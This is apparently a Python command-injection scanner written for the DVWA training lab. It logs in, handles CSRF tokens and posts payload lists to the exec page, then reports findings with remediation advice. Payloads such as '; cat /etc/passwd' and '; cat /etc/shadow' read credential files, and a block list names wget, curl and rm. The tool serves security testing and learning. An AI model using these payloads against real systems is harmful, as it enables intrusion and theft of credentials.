import sys
import os
import time
import json
import re
import argparse
from typing import Dict, Tuple, Optional, Any
from urllib.parse import urlparse
import requests
import urllib3
from bs4 import BeautifulSoup
from colorama import Fore, init
from datetime import datetime

try:
    from DVWAlogin import DvwaLogin
    print(f"{Fore.GREEN}[INFO] 成功导入DVWA登录模块")
except Exception as e:
    print(f"{Fore.RED}[ERROR] 无法导入DVWA登录模块: {e}")
    sys.exit(1)

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class DvwaCommandInjectionScanner:
    def __init__(
        self,
        timeout: int =3,
        delay_between_requests: float = 10.0,
        time_threshold: float = 3.0,
        max_payloads: Optional[int] = None,
        auto_detect_fields: bool = False,
        skip_dangerous: bool = True
    ):
        self.timeout = timeout
        self.delay_between_requests = delay_between_requests
        self.time_threshold = time_threshold
        self.max_payloads = max_payloads
        self.auto_detect_fields = auto_detect_fields
        self.skip_dangerous = skip_dangerous

        self.session: Optional[requests.Session] = None
        self.base_url: Optional[str] = None

        # 危险关键词（用于跳过过于危险的 payloads）
        self.dangerous_keywords = ['`whoami', '$(whoami)', '; sleep', 'sleep ', 'ping -c', '& timeout', 'rm ', 'wget ', 'curl ']

        # 表单字段（默认值）
        self.form_ip_field: str = 'ip'
        self.form_submit_field: str = 'Submit'
        self.csrf_field_name: Optional[str] = None
        self.csrf_token: Optional[str] = None

        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'payloads_tested': 0,
            'injection_points_found': 0,
            'dangers_skipped': 0
        }

        # payload 分类
        self.payloads = {
            'basic': ['127.0.0.1', 'localhost'],
            'unix_commands': [
                '; whoami', '; id', '; pwd', '; ls', '; ls -la', '; cat /etc/passwd',
                '| whoami', '| id', '&& whoami', '&& id', '|| whoami',
            ],
            'windows_commands': [
                '& whoami', '| whoami', '&& whoami', '|| whoami', '& ipconfig', '& dir', '& net user'
            ],
            'blind_injection': [
                '; sleep 3', '| sleep 3', '&& sleep 3', '; ping -c 3 127.0.0.1', '& ping -n 3 127.0.0.1'
            ],
            'file_operations': [
                '; cat /etc/passwd', '; cat /etc/shadow', '; head -n 10 /etc/passwd',
                '; tail -n 10 /etc/passwd', '& type C:\\Windows\\win.ini'
            ],
            'system_info': [
                '; uname -a', '; ps aux', '; netstat -an', '& systeminfo', '& tasklist'
            ]
        }

        self.command_indicators = {
            'unix': ['root', 'www-data', 'daemon', 'nobody', '/home/', '/var/www/', '/etc/passwd', 'uid=', 'gid='],
            'windows': ['Administrator', 'System32', 'Windows', 'C:\\', 'Program Files', 'win.ini', 'boot.ini'],
            'common': ['whoami', 'pwd', 'ls', 'dir', 'id', 'ipconfig', 'ifconfig']
        }
        self.error_indicators = [
            'command not found', 'not recognized', 'permission denied', 'no such file', 'syntax error', 'cannot find'
        ]

        self.default_headers = {'User-Agent': 'Mozilla/5.0 (DvwaScanner/Fixed)'}

    def setup_session(self, dvwa_login_instance: DvwaLogin) -> bool:
        """设置主 Session（用于保持登录状态）"""
        session_info = dvwa_login_instance.get_session_info()
        if not session_info:
            print(f"{Fore.RED}[ERROR] 无法获取会话信息，请先登录")
            return False

        self.session = session_info['session']
        self.base_url = session_info['base_url'].rstrip('/')
        if 'headers' in session_info and isinstance(session_info['headers'], dict):
            self.session.headers.update(session_info['headers'])
        self.session.headers.update(self.default_headers)
        print(f"{Fore.GREEN}[INFO] 会话设置成功 - Base URL: {self.base_url}")
        return True

    def _create_isolated_request(self, method: str = 'POST', data: Dict = None) -> Tuple[bool, Optional[requests.Response]]:
        """
        创建隔离的请求（使用新的 Session 实例，避免连接池污染）
        """
        if not self.session or not self.base_url:
            return False, None

        temp_session = requests.Session()
        temp_session.cookies.update(self.session.cookies)
        temp_session.headers.update(self.session.headers)
        temp_session.headers.update(self.default_headers)

        target_url = f"{self.base_url}/vulnerabilities/exec/"

        try:
            if method.upper() == 'GET':
                resp = temp_session.get(target_url, timeout=self.timeout, verify=False)
            else:
                resp = temp_session.post(target_url, data=data, timeout=self.timeout, verify=False)

            temp_session.close()
            return True, resp

        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[TIMEOUT] 请求超时（{self.timeout}秒）")
            temp_session.close()
            return False, None
        except Exception as e:
            print(f"{Fore.RED}[ERROR] 请求失败: {e}")
            temp_session.close()
            return False, None

    def _check_dvwa_health(self) -> bool:
        """检查 DVWA 是否还活着（简单的 GET 请求）"""
        print(f"{Fore.CYAN}[HEALTH] 检查 DVWA 健康状态...")
        ok, resp = self._create_isolated_request(method='GET')
        if ok and resp and resp.status_code == 200:
            print(f"{Fore.GREEN}[HEALTH] DVWA 正常响应")
            return True
        else:
            print(f"{Fore.RED}[HEALTH] DVWA 无响应或返回异常状态码，等待恢复...")
            # 在检测到异常时给予充足恢复时间
            time.sleep(5)
            return False

    def get_csrf_token_and_field(self, page_content: str) -> Tuple[Optional[str], Optional[str]]:
        """提取 CSRF token"""
        if not page_content:
            return None, None
        try:
            soup = BeautifulSoup(page_content, 'html.parser')
            candidates = ('user_token', 'token', 'csrf', 'csrf_token')
            for name in candidates:
                el = soup.find('input', attrs={'name': name})
                if el and el.get('value'):
                    return el.get('value'), name
            hidden_inputs = soup.find_all('input', attrs={'type': 'hidden'})
            for hid in hidden_inputs:
                nm = hid.get('name')
                val = hid.get('value')
                if nm and val and re.search(r'token|csrf|user', nm, re.I):
                    return val, nm
            m = re.search(r"name=['\"](?P<name>[^'\"]+)['\"]\s+value=['\"](?P<val>[^'\"]+)['\"]", page_content)
            if m:
                return m.group('val'), m.group('name')
        except Exception as e:
            print(f"{Fore.YELLOW}[WARN] CSRF 解析异常: {e}")
        return None, None

    def update_csrf_token(self, page_content: str) -> bool:
        """被动更新 CSRF token"""
        token, field = self.get_csrf_token_and_field(page_content)
        if token and field:
            self.csrf_token = token
            self.csrf_field_name = field
            print(f"{Fore.GREEN}[INFO] CSRF Token已更新: {field[:20]}...")
            return True
        return False

    def detect_form_fields(self, page_content: str):
        """自动检测表单字段"""
        if not self.auto_detect_fields or not page_content:
            return

        soup = BeautifulSoup(page_content, 'html.parser')
        form = soup.find('form')
        if not form:
            print(f"{Fore.YELLOW}[WARN] 未找到表单，使用默认字段名")
            return

        inputs = form.find_all('input')
        for inp in inputs:
            name = inp.get('name', '')
            if not name:
                continue

            low = name.lower()
            if 'ip' in low or 'host' in low and self.form_ip_field == 'ip':
                self.form_ip_field = name
                print(f"{Fore.CYAN}[INFO] 自动识别 IP 字段: {name}")

            typ = inp.get('type', '').lower()
            if typ in ('submit', 'button'):
                self.form_submit_field = name

    def build_post_data(self, ip_value: str) -> Dict[str, str]:
        """构造 POST 数据"""
        data = {self.form_ip_field: ip_value, self.form_submit_field: 'Submit'}
        if self.csrf_token and self.csrf_field_name:
            data[self.csrf_field_name] = self.csrf_token
        return data

    def normalize_text(self, html: str) -> str:
        if not html:
            return ''
        soup = BeautifulSoup(html, 'html.parser')
        text = soup.get_text(separator='\n')
        return text

    def detect_command_injection(self, response_text: str, payload: str) -> Dict[str, Any]:
        res = {'injected': False, 'evidence': [], 'os_type': 'unknown', 'confidence': 'low'}
        text = self.normalize_text(response_text).lower()
        payload_lower = payload.lower()

        for os_type, indicators in self.command_indicators.items():
            for indicator in indicators:
                if indicator.lower() in text:
                    res['injected'] = True
                    res['evidence'].append(indicator)
                    res['os_type'] = os_type
                    res['confidence'] = 'medium'

        for err in self.error_indicators:
            if err in text:
                res['injected'] = True
                res['evidence'].append(err)
                res['confidence'] = 'high'

        # 针对特定命令做输出格式检测
        for cmd in ('whoami', 'id', 'pwd', 'ls', 'dir'):
            if cmd in payload_lower:
                if self.check_command_output_pattern(text, cmd):
                    res['injected'] = True
                    res['evidence'].append(f'command_output_{cmd}')
                    res['confidence'] = 'high'
        return res

    def check_command_output_pattern(self, response_text: str, command: str) -> bool:
        patterns = {
            'whoami': [r'(?i)[a-z0-9_\-]{3,20}'],
            'id': [r'uid=\d+', r'gid=\d+'],
            'pwd': [r'/[a-z0-9_/\-]+', r'[a-z]:\\[a-z0-9_\\\-]+'],
            'ls': [r'total\s+\d+', r'-rw', r'drwx', r'directory'],
            'dir': [r'Directory of', r'Volume Serial', r'<DIR>', r'directory']
        }

        for pat in patterns.get(command, []):
            try:
                if re.search(pat, response_text, re.IGNORECASE):
                    return True
            except re.error:
                continue
        return False

    def _analyze_response_time(self, elapsed: float, baseline: float, payload: str) -> Dict[str, Any]:
        """分析响应时间是否表明时间盲注"""
        result = {'vulnerable': False, 'type': None, 'response_time': elapsed, 'confidence': 'low'}

        # 若延迟显著高于阈值，则判定为 time-based
        if baseline > 0 and (elapsed - baseline) >= self.time_threshold:
            result.update({'vulnerable': True, 'type': 'time_based', 'confidence': 'high'})
        elif elapsed >= (self.time_threshold + 1.0):
            result.update({'vulnerable': True, 'type': 'time_based', 'confidence': 'medium'})
        return result

    def _extract_relevant_sample(self, html: str) -> str:
        """智能提取响应样本"""
        if not html:
            return ''

        soup = BeautifulSoup(html, 'html.parser')
        for tag in soup.find_all(['pre', 'div']):
            classes = tag.get('class', [])
            text = tag.get_text()

            if tag.name == 'pre' or 'vulnerable' in ' '.join(classes).lower():
                if len(text.strip()) > 10:
                    return text[:800] + '...' if len(text) > 800 else text

        text = soup.get_text(separator='\n')
        return text[:800] + '...' if len(text) > 800 else text

    def scan_command_injection(self) -> Dict[str, Any]:
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[ERROR] 请先设置会话")
            return {}

        target_url = f"{self.base_url}/vulnerabilities/exec/"
        self.results['target_url'] = target_url
        print(f"{Fore.YELLOW}[START] 开始命令注入漏洞扫描: {target_url}")

        # 初始健康检查
        if not self._check_dvwa_health():
            print(f"{Fore.RED}[ERROR] DVWA 初始状态异常，无法扫描")
            return {}

        vulnerabilities = []
        total_payloads = sum(len(v) for v in self.payloads.values())
        tested_payloads = 0
        limit = self.max_payloads if self.max_payloads is not None else float('inf')
        consecutive_failures = 0

        try:
            for category, payload_list in self.payloads.items():
                print(f"{Fore.CYAN}[CATEGORY] 测试 {category} 类型 payload ...")

                for payload in payload_list:
                    if tested_payloads >= limit:
                        break

                    # 跳过配置为跳过的危险 payload
                    if self.skip_dangerous and any(d.lower() in payload.lower() for d in self.dangerous_keywords):
                        print(f"{Fore.YELLOW}[SKIP] 跳过高危 payload: {payload}")
                        self.results['dangers_skipped'] += 1
                        continue

                    tested_payloads += 1
                    progress = (tested_payloads / total_payloads) * 100
                    if tested_payloads % 5 == 0:
                        print(f"{Fore.YELLOW}[PROGRESS] 已完成 {tested_payloads}/{total_payloads} ({progress:.1f}%)")
                        # 每隔一段时间检查健康状况
                        if not self._check_dvwa_health():
                            print(f"{Fore.RED}[PAUSE] DVWA 未恢复，等待 15 秒...")
                            time.sleep(15)

                    print(f"{Fore.WHITE}[TEST] 测试 payload: {payload}")

                    if any(k in payload.lower() for k in ('sleep', 'ping', 'timeout')):
                        print(f"{Fore.YELLOW}[SKIP] 跳过盲注 payload（不执行 sleep / ping / timeout）: {payload}")
                        self.results['dangers_skipped'] += 1
                        continue

                    # CSRF 刷新策略：每 10 个 payload 刷新一次（减少 GET 请求）
                    if tested_payloads % 10 == 1:
                        ok, page_resp = self._create_isolated_request(method='GET')
                        if ok and page_resp:
                            # 更新 CSRF token（如果有）
                            self.update_csrf_token(page_resp.text)
                        print(f"{Fore.CYAN}[TOKEN] 每10个 payload 刷新一次 CSRF token")

                    # 发送请求（POST）
                    post_data = self.build_post_data(payload)
                    start = time.time()
                    ok, resp = self._create_isolated_request(data=post_data)
                    elapsed = time.time() - start

                    # 请求失败时的保护逻辑：立即减速并健康检查
                    if not ok or resp is None:
                        print(f"{Fore.RED}[WARN] 请求失败，服务器可能繁忙，休眠 15 秒...")
                        time.sleep(15)
                        self._check_dvwa_health()
                        consecutive_failures = 0
                        # 跳过当前 payload，继续下一个
                        continue
                    else:
                        consecutive_failures = 0

                    # 检测逻辑
                    detection_result = self.detect_command_injection(resp.text, payload)
                    time_result = None

                    if any(k in payload.lower() for k in ('sleep', 'ping', 'timeout')):
                        # 基于响应时间的盲注分析（以 elapsed 为准）
                        time_result = self._analyze_response_time(elapsed, 0.5, payload)

                    # 合并结果
                    is_vulnerable = detection_result['injected'] or (time_result and time_result['vulnerable'])
                    if is_vulnerable:
                        category_final = category
                        if time_result and time_result['vulnerable']:
                            category_final = 'time_based'

                        evidence = detection_result.get('evidence', [])
                        if time_result and time_result['vulnerable']:
                            evidence.append(f"time_delay_{time_result['response_time']:.1f}s")

                        vuln = {
                            'payload': payload,
                            'category': category_final,
                            'detection_result': {
                                'injected': True,
                                'evidence': evidence,
                                'os_type': detection_result.get('os_type', 'unknown'),
                                'confidence': detection_result.get('confidence', 'low'),
                                'response_time': elapsed if time_result else 0.0
                            },
                            'response_sample': self._extract_relevant_sample(resp.text)
                        }
                        vulnerabilities.append(vuln)
                        print(f"{Fore.GREEN}[VULNERABLE] 发现命令注入！证据: {evidence}")

                    # 在每个 payload 测试后强制休眠，避免资源快速累积
                    print(f"{Fore.CYAN}[SLEEP] Payload 测试完成，强制延时 1 秒以避免服务器过载...")
                    try:
                        time.sleep(1)
                    except KeyboardInterrupt:
                        # 允许用户中断，但在中断时尽量保存当前进度
                        print(f"{Fore.YELLOW}[INFO] 用户中断休眠")

                if tested_payloads >= limit:
                    break

        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}[INFO] 扫描手动中断，保存当前结果...")
        finally:
            if self.session:
                # 关闭主 session
                try:
                    self.session.close()
                except Exception:
                    pass

        # 更新并返回报告
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')
        self.results['vulnerabilities'] = vulnerabilities
        self.results['payloads_tested'] = tested_payloads
        self.results['injection_points_found'] = len(vulnerabilities)

        return self.generate_report()

    def generate_report(self) -> Dict[str, Any]:
        report = {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'payloads_tested': self.results['payloads_tested'],
                'injection_points_found': self.results['injection_points_found'],
                'total_vulnerabilities': len(self.results['vulnerabilities']),
                'dangers_skipped': self.results.get('dangers_skipped', 0)
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'payload_categories': list(self.payloads.keys()),
            'recommendations': [
                "实施输入验证和白名单过滤",
                "使用安全的 API 代替直接系统命令调用",
                "对用户输入进行适当的编码和转义",
                "使用最小权限原则运行应用程序",
                "实施命令执行监控和日志记录",
                "使用应用程序防火墙(WAF)"
            ]
        }
        return report

    def print_report(self, report: Dict[str, Any]):
        print(f"\n{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.CYAN}命令注入漏洞扫描报告")
        print(f"{Fore.YELLOW}{'=' * 60}")
        summary = report['scan_summary']
        print(f"{Fore.GREEN}目标URL: {summary['target_url']}")
        print(f"{Fore.GREEN}扫描时间: {summary['scan_time']}")
        print(f"{Fore.GREEN}测试Payload数量: {summary['payloads_tested']}")
        print(f"{Fore.GREEN}发现注入点: {summary['injection_points_found']}")
        print(f"{Fore.GREEN}总漏洞数: {summary['total_vulnerabilities']}")
        if summary.get('dangers_skipped', 0) > 0:
            print(f"{Fore.YELLOW}跳过高危Payload: {summary['dangers_skipped']}")

        if report['vulnerabilities']:
            print(f"\n{Fore.RED}{'!' * 60}")
            print(f"{Fore.RED}发现命令注入漏洞!")
            print(f"{Fore.RED}{'!' * 60}")
            for i, vuln in enumerate(report['vulnerabilities'], 1):
                print(f"\n{Fore.YELLOW}[漏洞 #{i}]")
                print(f"{Fore.CYAN}Payload: {vuln['payload']}")
                print(f"{Fore.CYAN}类型: {vuln['category']}")
                dr = vuln.get('detection_result', {})
                print(f"{Fore.CYAN}操作系统: {dr.get('os_type', '未知')}")
                print(f"{Fore.CYAN}置信度: {dr.get('confidence', '未知')}")
                if 'evidence' in dr:
                    print(f"{Fore.MAGENTA}检测证据: {dr['evidence']}")
                if dr.get('response_time', 0) > 0:
                    print(f"{Fore.MAGENTA}响应时间: {dr['response_time']:.2f}s")
                if 'response_sample' in vuln:
                    snippet = vuln['response_sample']
                    print(f"{Fore.WHITE}响应样本: {snippet[:800]}")
        else:
            print(f"\n{Fore.GREEN}{'✓' * 20}")
            print(f"{Fore.GREEN}未发现命令注入漏洞")
            print(f"{Fore.GREEN}{'✓' * 20}")

        print(f"\n{Fore.CYAN}测试的Payload类别:")
        for category in report['payload_categories']:
            print(f"  • {category}")

        print(f"\n{Fore.CYAN}安全建议:")
        for i, recommendation in enumerate(report['recommendations'], 1):
            print(f"  {i}. {recommendation}")


def is_valid_url(url: str) -> bool:
    """更严格的URL验证"""
    try:
        result = urlparse(url)
        return all([result.scheme in ('http', 'https'), result.netloc, len(url) < 2048])
    except Exception:
        return False


def main():
    parser = argparse.ArgumentParser(description="命令注入漏洞扫描器 ")
    parser.add_argument('--timeout', type=int, default=10, help='请求超时时间（秒）')
    parser.add_argument('--delay', type=float, default=10.0, help='请求间延时（秒） — 默认为 10s，建议根据目标机性能调整')
    parser.add_argument('--time_threshold', type=float, default=3.0, help='时间盲注判定阈值（秒）')
    parser.add_argument('--max_payloads', type=int, default=None, help='最大测试 payload 数量')
    parser.add_argument('--auto-detect-fields', action='store_true', help='自动检测表单字段')
    parser.add_argument('--skip-dangerous', action='store_true', default=True, help='跳过高危 payload（默认开启）')
    args = parser.parse_args()

    print(f"{Fore.CYAN}命令注入漏洞检测器")
    print("=" * 60)

    dvwa_url = input("请输入 DVWA 的 URL (例如: http://192.168.26.130:8085):    ").strip()
    if not dvwa_url or not is_valid_url(dvwa_url):
        print(f"{Fore.RED}URL 无效或为空")
        return

    print(f"{Fore.CYAN}[1/3] 初始化登录模块...")
    dvwa_login = DvwaLogin()

    print(f"{Fore.CYAN}[2/3] 登录 DVWA...")
    if not dvwa_login.login(dvwa_url):
        print(f"{Fore.RED}登录失败，程序退出")
        return

    dvwa_login.test_connection()

    print(f"{Fore.CYAN}[3/3] 初始化命令注入扫描器...")
    scanner = DvwaCommandInjectionScanner(
        timeout=args.timeout,
        delay_between_requests=args.delay,
        time_threshold=args.time_threshold,
        max_payloads=args.max_payloads,
        auto_detect_fields=args.auto_detect_fields,
        skip_dangerous=args.skip_dangerous
    )

    if not scanner.setup_session(dvwa_login):
        print(f"{Fore.RED}设置会话失败")
        return

    try:
        report = scanner.scan_command_injection()
        if report:
            scanner.print_report(report)

            # 保存报告
            base_path = os.path.dirname(os.path.abspath(__file__))
            report_dir = os.path.join(base_path, "scan_result", "DvwaCommandInjectionScanner")
            try:
                os.makedirs(report_dir, exist_ok=True)
                # 使用可读的时间格式生成文件名
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                filename = os.path.join(report_dir, f"command_injection_report_{timestamp}.json")

                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(report, f, indent=2, ensure_ascii=False)

                print(f"{Fore.GREEN}报告已保存到: {filename}")

            except Exception as e:
                print(f"{Fore.YELLOW}[WARN] 无法保存报告到指定目录: {e}")
                # 使用可读的时间格式生成文件名（备用）
                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                fallback_name = f"dvwa_command_injection_report_{timestamp}.json"
                with open(fallback_name, 'w', encoding='utf-8') as f:
                    json.dump(report, f, indent=2, ensure_ascii=False)
                print(f"{Fore.GREEN}报告已保存到当前目录: {fallback_name}")
        else:
            print(f"{Fore.RED}扫描失败或未返回结果")
    except Exception as e:
        print(f"{Fore.RED}[FATAL] 扫描发生异常: {e}")


if __name__ == "__main__":
    main()